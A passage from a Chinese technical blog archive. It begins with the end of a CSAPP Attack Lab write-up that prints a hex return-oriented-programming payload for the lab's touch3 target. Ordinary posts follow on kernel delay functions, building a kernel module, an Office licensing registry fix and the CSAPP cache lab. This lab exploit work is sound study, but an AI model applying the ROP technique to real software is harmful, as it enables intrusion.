<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00			# 改写返回地址为0x401aad</span><br><span class="line">a2 19 40 00 00 00 00 00			# 计算偏移的起始地址，返回地址+0x8</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00			# 确定偏移为0x48</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00			# touch3首地址为0x4018fa</span><br><span class="line">35 39 62 39 39 37 66 61			# cookie字符串地址，用这个地址减去计算偏移的起始地址得到偏移量为72, 即0x48</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image11.png"></p>
<h3><span id="总结">总结</span></h3><p>通过这次实验，初步了解栈和缓冲区溢出的原理，以及安全编码的重要性。</p>
<h3><span id="参考资料">参考资料</span></h3><p>《深入理解计算机系统 原书第3版》</p>
<p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab</a></p>
<p><a href="https://wdxtub.com/csapp/thick-csapp-lab-3/2016/04/16/">读厚CSAPP III Attack Lab</a></p>
<p><a href="https://blog.csdn.net/sdulibh/article/details/17913815?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">良性代码，恶意利用：浅谈 Return-Oriented 攻击</a></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>内核延时函数msleep和mdelay区别</title>
    <url>/2020/0815181004.html</url>
    <content><![CDATA[<p><code>msleep</code>和<code>mdelay</code>都是内核的延时函数，原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mdelay</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> msecs)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">msleep</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> millisecs)</span>;</span><br></pre></td></tr></table></figure>
<h2><span id="区别">区别</span></h2><p><code>mdelay</code>是忙等待函数，会占用<code>CPU</code>资源，延迟时间是准确的。</p>
<p><code>msleep</code>是休眠函数，不占用<code>CPU</code>资源，延迟时间通常高于给定值。</p>
<span id="more"></span>

<p><strong>具体可以参考如下文章：</strong></p>
<p><a href="https://topic.alibabacloud.com/a/the-difference-between-mdelay--and-msleep--in-linux-linux_1_16_20266988.html">The difference between Mdelay and Msleep in Linux</a></p>
<p><a href="https://www.cnblogs.com/xihong2014/p/6740876.html">Linux中内核延时函数</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核模块编译方法</title>
    <url>/2020/0815180606.html</url>
    <content><![CDATA[<h3><span id="运行环境">运行环境</span></h3><p><code>Linux debian 4.19.0-10-amd64</code></p>
<h3><span id="编译内核模块">编译内核模块</span></h3><h4><span id="0-准备编译所需的内核头文件">0. 准备编译所需的内核头文件</span></h4><p>系统默认内核头文件路径在&#x2F;lib&#x2F;modules&#x2F;`uname -r`，先确认该路径是否存在：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /lib/modules/`uname -r`/build</span><br></pre></td></tr></table></figure>

<p>如路径不存在，需要先安装内核头文件，方法如下：</p>
<span id="more"></span>

<ul>
<li><p>获取内核版本，使用<code>uname -r</code>查看，这里为<code>4.19.0-10-amd64</code></p>
</li>
<li><p><code>apt search 4.19.0-10-amd64</code>查找安装包名称，这里为<code>linux-headers-4.19.0-10-amd64</code></p>
</li>
<li><p>安装内核头文件，执行<code>apt-get install linux-headers-4.19.0-10-amd64</code>，安装路径为<code>/usr/src/linux-headers-4.19.0-10-amd64</code></p>
</li>
</ul>
<h4><span id="1-编写helloc">1. 编写<code>hello.c</code></span></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>           <span class="comment">// 编译内核模块必须加载的头文件module.h</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_init\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);    <span class="comment">// 模块加载</span></span><br><span class="line">module_exit(hello_exit);    <span class="comment">// 模块卸载</span></span><br></pre></td></tr></table></figure>

<p>模块加载时打印<code>hello_init</code>, 模块卸载时打印<code>hello_exit</code>。</p>
<h4><span id="2编写makefile">2.编写Makefile</span></h4><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">obj-m += hello.o    						<span class="comment"># -m编译内核模块</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">PWD=<span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">KDIR=/usr/src/linux-headers-4.19.0-10-amd64 <span class="comment"># 指定内核头文件路径</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules     <span class="comment"># -C指定内核头文件路径, M指定源码路径</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    <span class="variable">$(MAKE)</span> -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<p><code>PWD</code>指定源码路径，即<code>hello.c</code>的路径。</p>
<p><code>KDIR</code>指定内核源码路径。</p>
<p><code>KERNELRELEASE</code>是在内核源码的顶层Makefile里定义的变量，用法可参考<a href="https://blog.csdn.net/cjluxuwei/article/details/37878021">这篇文章</a></p>
<h4><span id="3加载模块">3.加载模块</span></h4><p>加载ko：<code>insmod hello.ko</code></p>
<p>卸载ko：<code>rmmod hello.ko</code></p>
<p>查看ko是否加载：<code>lsmod | grep hello.ko</code></p>
<p>打印信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># dmesg -c</span><br><span class="line">[  821.764791] hello_init</span><br><span class="line">[  897.219392] hello_exit</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Office无法找到应用程序许可证</title>
    <url>/2020/0815180245.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>打开<code>office</code>软件失败，提示无法找到应用程序的许可证。</p>
<h2><span id="原因">原因</span></h2><p><code>Software Protection</code>服务启动失败，可以通过<code>services.msc</code>查看该服务的启动状态</p>
<h2><span id="解决方法">解决方法</span></h2><p>修改注册表，将如下文本复制到文件，文件名改为<code>software prtection服务.reg</code>, 双击该文件即可。</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc]</span><br><span class="line">&quot;StartProtected&quot;=dword:00000001</span><br><span class="line">&quot;DisplayName&quot;=&quot;@%SystemRoot%\\system32\\sppsvc.exe,-101&quot;</span><br><span class="line">&quot;ErrorControl&quot;=dword:00000001</span><br><span class="line">&quot;ImagePath&quot;=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,\</span><br><span class="line">  74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,00,73,\</span><br><span class="line">  00,70,00,70,00,73,00,76,00,63,00,2e,00,65,00,78,00,65,00,00,00</span><br><span class="line">&quot;Start&quot;=dword:00000002</span><br><span class="line">&quot;Type&quot;=dword:00000010</span><br><span class="line">&quot;Description&quot;=&quot;@%SystemRoot%\\system32\\sppsvc.exe,-100&quot;</span><br><span class="line">&quot;DependOnService&quot;=hex(7):52,00,70,00,63,00,53,00,73,00,00,00,00,00</span><br><span class="line">&quot;ObjectName&quot;=&quot;NT AUTHORITY\\NetworkService&quot;</span><br><span class="line">&quot;ServiceSidType&quot;=dword:00000001</span><br><span class="line">&quot;RequiredPrivileges&quot;=hex(7):53,00,65,00,41,00,75,00,64,00,69,00,74,00,50,00,72,\</span><br><span class="line">  00,69,00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,43,00,68,00,\</span><br><span class="line">  61,00,6e,00,67,00,65,00,4e,00,6f,00,74,00,69,00,66,00,79,00,50,00,72,00,69,\</span><br><span class="line">  00,76,00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,43,00,72,00,65,00,\</span><br><span class="line">  61,00,74,00,65,00,47,00,6c,00,6f,00,62,00,61,00,6c,00,50,00,72,00,69,00,76,\</span><br><span class="line">  00,69,00,6c,00,65,00,67,00,65,00,00,00,53,00,65,00,49,00,6d,00,70,00,65,00,\</span><br><span class="line">  72,00,73,00,6f,00,6e,00,61,00,74,00,65,00,50,00,72,00,69,00,76,00,69,00,6c,\</span><br><span class="line">  00,65,00,67,00,65,00,00,00,00,00</span><br><span class="line">&quot;DelayedAutoStart&quot;=dword:00000001</span><br><span class="line">&quot;FailureActions&quot;=hex:80,51,01,00,00,00,00,00,00,00,00,00,03,00,00,00,14,00,00,\</span><br><span class="line">  00,01,00,00,00,c0,d4,01,00,01,00,00,00,e0,93,04,00,00,00,00,00,00,00,00,00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc\Security]</span><br><span class="line">&quot;Security&quot;=hex:01,00,14,80,a0,00,00,00,ac,00,00,00,14,00,00,00,30,00,00,00,02,\</span><br><span class="line">  00,1c,00,01,00,00,00,02,80,14,00,ff,01,0f,00,01,01,00,00,00,00,00,01,00,00,\</span><br><span class="line">  00,00,02,00,70,00,05,00,00,00,00,00,14,00,ff,01,02,00,01,01,00,00,00,00,00,\</span><br><span class="line">  05,12,00,00,00,00,00,18,00,fd,01,0f,00,01,02,00,00,00,00,00,05,20,00,00,00,\</span><br><span class="line">  20,02,00,00,00,00,14,00,9d,01,02,00,01,01,00,00,00,00,00,05,04,00,00,00,00,\</span><br><span class="line">  00,14,00,9d,01,02,00,01,01,00,00,00,00,00,05,06,00,00,00,00,00,14,00,14,00,\</span><br><span class="line">  00,00,01,01,00,00,00,00,00,05,0b,00,00,00,01,01,00,00,00,00,00,05,12,00,00,\</span><br><span class="line">  00,01,01,00,00,00,00,00,05,12,00,00,00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc\TriggerInfo]</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc\TriggerInfo\0]</span><br><span class="line">&quot;Type&quot;=dword:00000014</span><br><span class="line">&quot;Action&quot;=dword:00000001</span><br><span class="line">&quot;GUID&quot;=hex:da,8a,52,f5,5f,be,14,4f,8a,ef,a9,5d,e7,28,11,61</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://blog.csdn.net/jenyzhang/article/details/51867485">https://blog.csdn.net/jenyzhang/article/details/51867485</a></p>
]]></content>
      <categories>
        <category>Win</category>
      </categories>
      <tags>
        <tag>Win</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP 缓存实验</title>
    <url>/2020/0816181217.html</url>
    <content><![CDATA[<h3><span id="实验简介">实验简介</span></h3><p>编写一个通用高速缓存模拟器，并优化小型矩阵转置核心函数，以最小化对模拟高速缓存的不命中次数。</p>
<h3><span id="预备知识">预备知识</span></h3><h4><span id="1-局部性原理">1. 局部性原理</span></h4><p>局部性通常有两种形式：</p>
<ul>
<li>时间局部性：被引用过一次的内存位置很可能在不远的将来被多次引用。</li>
<li>空间局部性：如一个内存位置被引用，其附近的内存位置很可能在不远的将来被引用。</li>
</ul>
<span id="more"></span>

<h4><span id="2-存储器层次结构">2. 存储器层次结构</span></h4><p>下图展示了一个典型的存储器层次结构：<br><img data-src="/2020/0816181217/image1.png"></p>
<p>可以看出，从高往低走，存储设备变得更慢，更大，更便宜。</p>
<h4><span id="3-缓存">3. 缓存</span></h4><p>缓存被组织成一个有S组，每组E行，每行由一个B字节数据块、一个有效位、一个标记位组成。结构如下：<br><img data-src="/2020/0816181217/image2.png"></p>
<p>一个m位地址被划分为标记、组索引、块偏移三个部分。</p>
<p>缓存确定一个请求是否命中，然后抽取被请求字的过程分为三步：</p>
<ul>
<li>组选择：从地址中间抽取s位组索引，得到组号i。比如s&#x3D;4, 组索引为0010时，组号i &#x3D; 2。</li>
<li>行匹配：从地址抽取t位标记，与组i中每个行的标记进行比较，如标记相等且有效位为1则命中。</li>
<li>字抽取：根据地址的b位块偏移, 直接从行中得到数据。</li>
</ul>
<h3><span id="实验准备">实验准备</span></h3><p>从<a href="http://csapp.cs.cmu.edu/3e/labs.html">CSAPP官网</a>获取实验文件。</p>
<p>阅读<a href="http://csapp.cs.cmu.edu/3e/cachelab.pdf">cachelab.pdf</a>，了解实验内容。</p>
<h3><span id="实验一-实现缓存模拟器">实验一： 实现缓存模拟器</span></h3><p>修改<code>csim.c</code>， 实现<code>LRU</code>策略的缓存模拟器，最终目标是与<code>csim-ref</code>执行结果一致。</p>
<p><strong>实现要点：</strong></p>
<ul>
<li><p>使用<code>getopt</code>解析命令行参数，<code>man 3 getopt</code>查看用法。</p>
</li>
<li><p>解析<code>traces</code>文件，可以使用<code>fgets</code>和<code>sscanf</code>实现。</p>
</li>
<li><p>缓存结构本质是一个二维数组 <code>cache[S][E]</code>，但由于<code>s</code>, <code>E</code>, <code>b</code>不确定, 需要使用<code>malloc</code>分配。</p>
</li>
<li><p>缓存替换策略采用<code>LRU</code>，可通过每行设计一个时间戳，每更新一次缓存将时间戳加1。</p>
</li>
</ul>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 命令行参数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Args</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line">    <span class="type">int</span> E;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    <span class="type">char</span> traceFile[BUFFER_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// getopt解析命令行输入</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">parseArgs</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Args *args)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> opt;</span><br><span class="line">    <span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (opt == <span class="string">&#x27;h&#x27;</span>) &#123;</span><br><span class="line">            printHelp();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;s&#x27;</span>) &#123;</span><br><span class="line">            args-&gt;s = atoi(optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;E&#x27;</span>) &#123;</span><br><span class="line">            args-&gt;E = atoi(optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;b&#x27;</span>) &#123;</span><br><span class="line">            args-&gt;b = atoi(optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (opt == <span class="string">&#x27;t&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(args-&gt;traceFile, optarg);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化Cache结构</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initCache</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="keyword">struct</span> Args *args)</span> &#123;</span><br><span class="line">    cache-&gt;s = args-&gt;s;</span><br><span class="line">    cache-&gt;S = <span class="number">1</span> &lt;&lt; cache-&gt;s;</span><br><span class="line">    cache-&gt;E = args-&gt;E;</span><br><span class="line">    cache-&gt;b = args-&gt;b;</span><br><span class="line">    cache-&gt;sets = (<span class="keyword">struct</span> CacheSet *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> CacheSet) * cache-&gt;S);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; ++i) &#123;</span><br><span class="line">        cache-&gt;sets[i].lines = (<span class="keyword">struct</span> CacheLine *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> CacheLine) * cache-&gt;E);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; cache-&gt;E; ++j) &#123;</span><br><span class="line">            cache-&gt;sets[i].lines[j].valid = INVALID;</span><br><span class="line">            cache-&gt;sets[i].lines[j].tag = INVALID_TAG;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放Cache</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">recycleCache</span><span class="params">(<span class="keyword">struct</span> Cache *cache)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; cache-&gt;S; ++i) &#123;</span><br><span class="line">        <span class="built_in">free</span>(cache-&gt;sets[i].lines);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(cache-&gt;sets);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateTimeStamp</span><span class="params">(<span class="keyword">struct</span> Cache *cache)</span> &#123;</span><br><span class="line">    <span class="type">int</span> numSets = cache-&gt;S;</span><br><span class="line">    <span class="type">int</span> numLines = cache-&gt;E;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; numSets; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; numLines; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cache-&gt;sets[i].lines[j].valid == VALID) &#123;</span><br><span class="line">                ++cache-&gt;sets[i].lines[j].timestamp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="type">int64_t</span> addr, <span class="keyword">struct</span> Result *result)</span> &#123;</span><br><span class="line">    <span class="type">int</span> numLines = cache-&gt;E;</span><br><span class="line">    <span class="comment">// 标记 + 组索引(s位) + 块偏移(b位)</span></span><br><span class="line">    <span class="type">int</span> setIndex = (addr &gt;&gt; cache-&gt;b) &amp; (cache-&gt;S - <span class="number">1</span>); <span class="comment">// 先求s位组索引, 得到addr位于第几组</span></span><br><span class="line">    <span class="type">int</span> tag = addr &gt;&gt; (cache-&gt;s + cache-&gt;b);            <span class="comment">// 求出tag, 方法为地址右移s+b位</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CacheSet</span> *<span class="title">curSet</span> =</span> &amp;cache-&gt;sets[setIndex];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; numLines; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curSet-&gt;lines[i].tag == tag) &#123;  <span class="comment">// tag相等表示命中</span></span><br><span class="line">            ++result-&gt;hits;</span><br><span class="line">            curSet-&gt;lines[i].timestamp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不命中</span></span><br><span class="line">    ++result-&gt;misses;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; numLines; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curSet-&gt;lines[i].valid == INVALID) &#123; <span class="comment">// 找到一个空行</span></span><br><span class="line">            curSet-&gt;lines[i].tag = tag;</span><br><span class="line">            curSet-&gt;lines[i].valid = VALID;</span><br><span class="line">            curSet-&gt;lines[i].timestamp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 没有命中又没有空行, 表示冲突不命中</span></span><br><span class="line">    ++result-&gt;evictions;</span><br><span class="line">    <span class="type">int</span> maxIdx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxTime = curSet-&gt;lines[<span class="number">0</span>].timestamp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; numLines; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(curSet-&gt;lines[i].timestamp &gt; maxTime) &#123;</span><br><span class="line">            maxTime = curSet-&gt;lines[i].timestamp;</span><br><span class="line">            maxIdx = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    curSet-&gt;lines[maxIdx].tag = tag;</span><br><span class="line">    curSet-&gt;lines[maxIdx].timestamp = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">updateCache</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="type">char</span> ch, <span class="type">int64_t</span> addr, <span class="keyword">struct</span> Result *result)</span></span><br><span class="line">&#123;</span><br><span class="line">    update(cache, addr, result);</span><br><span class="line">    <span class="keyword">if</span>(ch == <span class="string">&#x27;M&#x27;</span>) &#123;                 <span class="comment">// 一次读取加上一次写入, 相当于update两次</span></span><br><span class="line">        update(cache, addr, result);</span><br><span class="line">    &#125;</span><br><span class="line">    updateTimeStamp(cache);         <span class="comment">// 每条指令执行后更新timestamp</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DoParse</span><span class="params">(<span class="keyword">struct</span> Cache *cache, <span class="type">char</span> *traceFile, <span class="keyword">struct</span> Result *result)</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int64_t</span> addr;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    fp = fopen(traceFile, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open traceFile: %s failed!\n&quot;</span>, traceFile);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// fgets + sscanf解析trace文件</span></span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, BUFFER_SIZE, fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>) &#123; <span class="comment">// &#x27;I&#x27;表示指令cache，不做处理</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sscanf</span>(buf, <span class="string">&quot; %c %lx,%d\n&quot;</span>, &amp;ch, &amp;addr, &amp;size);</span><br><span class="line">        updateCache(cache, ch, addr, result);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Args</span> <span class="title">args</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Cache</span> <span class="title">cache</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Result</span> <span class="title">res</span> =</span> &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    parseArgs(argc, argv, &amp;args);</span><br><span class="line">    initCache(&amp;cache, &amp;args);</span><br><span class="line">    DoParse(&amp;cache, args.traceFile, &amp;res);</span><br><span class="line">    recycleCache(&amp;cache);</span><br><span class="line">    printSummary(res.hits, res.misses, res.evictions);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="实验二-优化矩阵转置">实验二： 优化矩阵转置</span></h3><p>实验二要求在<code>trans.c</code>中实现矩阵转置函数，最小化缓存不命中的次数。</p>
<p>实验二中的缓存结构为 <code>S = 5, E = 1, b = 5</code>，即32组，每组1行，每行32字节，每行可放8个<code>int</code>数</p>
<p>利用分块技术和局部变量减少miss，分块技术可参考 <a href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">waside-blocking.pdf</a></p>
<h4><span id="32-32">32 * 32</span></h4><p>由于缓存的每一行能放8个数，考虑将32 * 32划分为16个8 * 8 的分块，每次处理单个8 * 8的分块，再利用局部变量减少miss。代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> a1, a2, a3, a4, a5, a6, a7, a8;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; M; i += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; N; j += <span class="number">8</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = i; k &lt; i + <span class="number">8</span>; ++k) &#123;</span><br><span class="line">                    a1 = A[k][j];</span><br><span class="line">                    a2 = A[k][j+<span class="number">1</span>];</span><br><span class="line">                    a3 = A[k][j+<span class="number">2</span>];</span><br><span class="line">                    a4 = A[k][j+<span class="number">3</span>];</span><br><span class="line">                    a5 = A[k][j+<span class="number">4</span>];</span><br><span class="line">                    a6 = A[k][j+<span class="number">5</span>];</span><br><span class="line">                    a7 = A[k][j+<span class="number">6</span>];</span><br><span class="line">                    a8 = A[k][j+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[j][k] = a1;</span><br><span class="line">                    B[j+<span class="number">1</span>][k] = a2;</span><br><span class="line">                    B[j+<span class="number">2</span>][k] = a3;</span><br><span class="line">                    B[j+<span class="number">3</span>][k] = a4;</span><br><span class="line">                    B[j+<span class="number">4</span>][k] = a5;</span><br><span class="line">                    B[j+<span class="number">5</span>][k] = a6;</span><br><span class="line">                    B[j+<span class="number">6</span>][k] = a7;</span><br><span class="line">                    B[j+<span class="number">7</span>][k] = a8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果改用4 * 4分块，会导致缓存利用不足，因为缓存的一行可以放8个数；也不能用16 * 16分块，会导致块内冲突。</p>
<p>使用8个局部变量(<code>a1 ~ a8</code>）的目的是避免写入B时，在对角线发生冲突不命中。因为A和B中相同位置的元素会映射到同一行。而矩阵转置不会改变对角线上的元素位置，导致多出现两次不命中。</p>
<h4><span id="61-67">61 * 67</span></h4><p>和32*32类似，尝试分块法，发现8 * 8即可满足要求，再利用局部变量减少<code>miss</code>。</p>
<p>首先对56 * 64部分进行8 * 8分块，其余部分直接简单转置即可。</p>
